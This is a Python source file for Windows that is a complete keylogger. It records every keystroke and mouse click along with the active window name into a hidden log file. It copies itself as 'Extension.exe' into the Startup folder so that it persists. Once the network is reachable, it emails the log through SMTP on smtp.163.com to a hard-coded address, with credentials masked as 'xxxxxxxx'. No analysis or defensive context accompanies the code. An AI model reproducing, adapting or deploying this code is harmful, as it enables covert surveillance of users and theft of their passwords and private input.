#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-10-19 19:37:16
# @Author  : Sundae Chen (sundaechn@gmail.com)
# @Link    : http://sundae.applinzi.com/home


import os
import pythoncom
import pyHook
import win32api
import win32con
import shutil
import urllib2
from time import sleep
from time import *
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.header import Header
from email.utils import parseaddr, formataddr
import smtplib


def smtp():
    global txt
    from_addr = 'xxxxxxxx@163.com'
    smtp = 'xxxxxxxx'
    to_addr = 'xxxxxxxx@163.com'
    smtp_sever = 'smtp.163.com'
    msg = MIMEMultipart()
    name1, addr1 = parseaddr('Sundae <%s>' % from_addr)
    msg['From'] = formataddr((Header(name1, 'utf-8').encode(), addr1))
    name2, addr2 = parseaddr('Administer <%s>' % to_addr)
    msg['To'] = formataddr((Header(name2, 'utf-8').encode(), addr2))
    msg['Subject'] = Header('from GUY welcome...', 'utf-8').encode()
    msg.attach(MIMEText('Hello, guy...', 'plain', 'utf-8'))

    with open(txt, 'rb') as f:
        mime = MIMEBase('txt', 'txt', filename='Extension.txt')
        mime.add_header('Content-Disposition', 'attachment',
                        filename='Extension.txt')
        mime.add_header('Content-ID', '<0>')
        mime.add_header('X-Attachment-Id', '0')
        mime.set_payload(f.read())
        encoders.encode_base64(mime)
        msg.attach(mime)

    sever = smtplib.SMTP(smtp_sever, 25)
    sever.set_debuglevel(1)
    sever.login(from_addr, smtp)
    sever.sendmail(from_addr, [to_addr], msg.as_string())
    sever.quit()


def onKeyboardEvent(event):
    global txt
    file = open(txt, 'a')
    result = "Time: "+str(asctime())+"  "+"Name: " + \
        str(event.WindowName)+"  "+"Key: "+str(event.Key)+"\n"
    file.writelines(result)
    return True


def onMouseEvent(event):
    global txt
    if event.MessageName == "mouse move":
        return True
    else:
        file = open(txt, 'a')
        result = "Time: "+str(asctime())+"  "+"Name: "+str(event.WindowName) + \
            "  "+"Event: "+str(event.MessageName)+"\n"
        file.writelines(result)
        return True


def Ucopy():
    global direxe
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                              r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders', 0, win32con.KEY_READ)
    startup = win32api.RegQueryValueEx(key, 'Startup')[0]
    dir = os.path.abspath('.')
    try:
        shutil.copy(str(dir)+'/Extension.exe', startup)
    except Exception as e:
        pass


def url():
    try:
        response = urllib2.urlopen('https://www.baidu.com/')
    except urllib2.URLError as e:
        return 0
    return 1


def main():
    Ucopy()
    global txt
    with open(txt, 'a') as nut:
        nut.writelines("\n"+"Time is :"+str(asctime())+"\n"+"\n")
    while url() == 0:
        sleep(5)
    try:
        smtp()
        os.remove(txt)
    except Exception as e:
        pass
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    hm.MouseAll = onMouseEvent
    hm.HookMouse()
    pythoncom.PumpMessages()

if os.path.isdir('D:/'):
    if os.path.isdir("D:/Extension"):
        txt = "D:/Extension/Extension.txt"
    else:
        os.mkdir("D:/Extension")
        txt = "D:/Extension/Extension.txt"
elif os.path.isdir('E:/'):
    if os.path.isdir("E:/Extension"):
        txt = "E:/Extension/Extension.txt"
    else:
        os.mkdir("E:/Extension")
        txt = "E:/Extension/Extension.txt"
elif os.path.isdir('F:/'):
    if os.path.isdir("F:/Extension"):
        txt = "F:/Extension/Extension.txt"
    else:
        os.mkdir("F:/Extension")
        txt = "F:/Extension/Extension.txt"
else:
    pass

if __name__ == "__main__":
    main()
